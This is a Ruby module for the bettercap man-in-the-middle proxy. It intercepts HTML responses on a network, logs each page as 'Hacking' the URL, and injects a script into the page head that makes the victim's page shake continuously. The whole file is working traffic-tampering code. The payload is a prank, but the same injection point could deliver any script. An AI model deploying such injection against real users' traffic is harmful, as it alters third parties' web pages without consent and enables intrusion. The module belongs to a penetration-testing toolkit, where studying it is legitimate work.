=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end
class ShakeScreen < Proxy::Module
  def on_request( request, response )
    # is it a html page?
    if response.content_type =~ /^text\/html.*/
      Logger.info "Hacking http://#{request.host}#{request.url}"
      # make sure to use sub! or gsub! to update the instance
      response.body.sub!( '<head>', '<head> <script type="text/javascript">
window.onload=function() {
    var move=document.getElementsByTagName("body")[0];
    setInterval(function() {
        move.style.marginTop=(move.style.marginTop=="4px")?"-4px":"4px";
    }, 5);
}
</script>' )
    end
  end
end
